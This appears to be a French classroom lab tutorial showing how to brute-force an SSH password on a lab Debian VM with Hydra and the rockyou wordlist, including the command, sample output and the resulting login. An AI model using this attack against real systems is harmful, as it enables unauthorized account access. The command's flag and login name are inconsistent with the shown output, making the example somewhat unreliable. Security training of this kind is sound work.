# Brute force avec Hydra

🚩 Attention il est interdit d'accéder à des systèmes sans autorisation🏴‍☠️

Support : 

* VM Kalilinux avec utilisation de **Hydra**
* VM Debian 12

### Mise en situation :
>  Votre société Ciel_Pentester vient de réaliser un audit sur la société XX afin d’identifier la surface d’attaque.
>
> Après une cartographie complète, vous avez découvert une machine debian.
>
> Nous allons utiliser Hydra. Hydra est un outil de test de pénétration utilisé pour effectuer des attaques par force brute sur divers services, y compris SSH.

### Objectif :

✨ Vous devez arriver à vous connecter en SSH à la machine Debian à partir de Kalilinux. Vous devez découvrir le mot de passe de la session user.

-----
Une **attaque par brute force** teste un grand nombre de combinaisons pour trouver le bon mot de passe.
Ici nous allons utiliser une variante de l'attaque brute force, **attaque par dictionnaire**


## Prérequis 1 :

Nous allons utiliser un dictionnaire

* rockyou



-----

## Méthode

Lancer Hydra sous Kalilinux

    hydra -l idpatron -p /usr/share/wordlists/rockyou.txt -u -e s ssh://192.168.56.XX

Réponse :
>
> hydra ....
>
>...
>
>[22][ssh] host: 192.168.56.XX  login: ippatron  password: mdpdepatron
>

Nous avons bien trouvé notre mot de passe : **mdpdepatron** qui est lié à l'utilisateur **idpatron**

On va faire un test de connection

      ssh idpatron@192.168.56.XX
  
mot de passe : **mdpdepatron**

Exemple vous êtes connecté  ✔️  id@debian:


> [!NOTE]
> Si le mot de passe n'est pas découvert vous pouver utiliser d'autres dictionnaires, allez voir Liste_dictionnaire.md
> https://github.com/profelecmed/profelecmed/blob/main/Cybers%C3%A9curit%C3%A9/VM_kali/brute%20force%20avec%20john%20the%20ripper/Liste_dictionnaire.md

